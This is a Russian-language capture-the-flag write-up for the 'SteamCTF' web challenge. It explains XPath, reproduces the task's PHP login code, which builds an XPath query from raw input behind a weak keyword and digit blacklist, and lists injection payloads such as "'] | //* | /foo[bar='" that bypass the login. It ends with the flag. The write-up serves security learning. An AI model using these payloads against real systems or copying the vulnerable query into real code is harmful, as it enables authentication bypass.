## SteamCTF

| Событие | Название | Категория | Сложность |
|:--------|:---------|:----------|----------:|
| final_isetCTF 2020 | SteamCTF | Web | ........ |

### Описание
> Автор: [ @dikidikiday ]
>
> **Записки охранника Игоря:** *день первый*
> 
> Во всей моей профессиональной практике я не находил более ответственного, ленивого,но прилежного сисадмина, чем этот новичок. Он мне сразу не понравился. Ну даже мне понятно, что от рута в консоли не надо работать!! Я вот сижу под своим **Игорь** и всем доволен! Вообще в нашем банке есть особенная система, специально, чтобы не вести таблицу доходов/расходов, но попробуй объясни это новичку...
> В этой системе обращение к элементам **документа**, имеющего древовидную структуру, напоминает взаимодействие с файловой системой **(/)**.
> Всем удобно, никто не жалуется.
> Эту [систему](http://ваш_сайт:1001) создал старый сисадмин Павлик, но его выгнали, из-за этого он ушёл и даже не сказал пароль!!!
> Знаю только, что он фанат Warface. Ээх..поиграть бы..
> Но для начала надо найти пароль, вдруг он его куда-нибудь записал...

### Решение 

Самое сложное и важное -- прочитать условие.
Понимаем, что повествование переключилось, теперь идет не от лица горе-сисадмина, а от лица охранника Игоря. Выделено имя -- на заметку, скорее всего надо будет ломать именно его.
Система, похожая чем-то на БД из прошлых соревнований первого дня.
Документ,имеющий древовидную структуру намекает на **XML документ**.

Гуглим.

**XML (eXtensible Markup Language)** – это всем известный язык разметки, с помощью которого создаются XML документы, имеющие древовидную структуру. 

Пример простейшего XML документа:

```
<?xml version="1.0" encoding="UTF-8"?>
<foo>
<bar param="value"/>
</foo>
```

Гуглим еще.

**XPath (XML Path Language)** – это язык, который предназначен для произвольного обращения к частям XML документа.

О! То, что надо!

По аналогии с первым вебом на прошлых соревнованиях можно предположить, что тут тоже инъекция, тем более такая есть, а автор намекает на это.

Гуглим [туц](https://raz0r.name/articles/vvedenie-v-xpath-inekcii/) и [туц](https://xakep.ru/2008/06/24/44160/)

Представим что у нас есть XML база и аутентификация, основанная на ней:

```
<?xml version='1.0' encoding='ISO-8859-1'?> <users>
    <user>
        <id> 1 </id>
        <username> admin </username>
        <password> xp8th! </password>
    </user>

    <user>
        <id> 2 </id>
        <username> test </username>
        <password> test987 </password>
    </user>

    <user>
        <id> 3 </id>
        <username> bigolnerd </username>
        <password> nerdsneedlovetoo
</password>
</user>
</users>
```

Можно сразу было попробовать вставить кавычку и понять, что это была xpath inj:
```
Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/html/index.php on line 561

Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/html/index.php on line 561
```

`'1'='1` и аналогичные кавычки не работают, также блочатся `or` и цифры.

Зайдя в исходный код страницы, находим ссылку
`<!-- <a href="/index.php/src/">Исходный код</a> -->` на исходный код.

Видим, что пользовательский ввод через поля **login** и **password** фильтруется:

```php
$blacklist = Array('or','0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
``` 

Также, наюблюдаем очень странную проверку верности введённых пользователем данных:

```
        if ($_SERVER['REQUEST_METHOD'] === 'POST'){
          $login = $_POST['login'];
          $pass = $_POST['pass'];
          if(contains($pass, $blacklist) or contains($login, $blacklist)){
              die("Простите, тут запрещено хекать!!");
          }
          else{
            $xml = simplexml_load_file('/users.xml');

            $query = "//users/user[login/text()='$login' and password/text()='$pass']";

            $result = $xml->xpath($query);
            if(!$result){
                echo "Попробуй еще раз! Я верю в тебя!";
            }
            else{
                $user_data = $xml->xpath("//users/user[login/text()='$login']")[0];
                $flag = $user_data->flag;
                echo "Ваш флаг STEAMCTF: ".$flag;
            }
          }
        }
```

Видим, что нам нужно провести инъекцию в поле **password** так, чтобы запрос был верным и выдал хотя бы один результат, а в поле **login** ввести необходимого нам пользователя (из описания задания можно понять, что нам необходим **Игорь**).

Учитывая фильтры, простейшие инъекции:
```
'] | //* | /foo[bar='
'] | /* | /foo[bar='
'] | /users/user | /foo[bar='
```

При этом последний вариант можно вставить только в логин.


**Флаг:**

> flag{xp4tH_I5_jU5T_4_w4rM_uP}
